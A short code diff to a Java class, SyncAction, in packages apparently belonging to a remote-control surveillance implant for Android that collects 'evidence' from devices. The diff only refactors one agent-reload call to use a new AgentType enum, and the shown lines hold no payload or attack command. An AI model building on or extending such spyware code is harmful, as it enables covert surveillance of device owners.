@@ -19,6 +19,7 @@ import com.ht.RCSAndroidGUI.action.sync.Transport;
 import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
+import com.ht.RCSAndroidGUI.agent.AgentType;
 import com.ht.RCSAndroidGUI.evidence.Evidence;
 import com.ht.RCSAndroidGUI.evidence.EvidenceCollector;
 import com.ht.RCSAndroidGUI.util.Check;
@@ -95,7 +96,7 @@ public abstract class SyncAction extends SubAction {
 		wantReload = false;
 		wantUninstall = false;
 
-		agentManager.reload(AgentConf.AGENT_DEVICE);
+		agentManager.reload(AgentType.AGENT_DEVICE);
 
 		boolean ret = false;
 
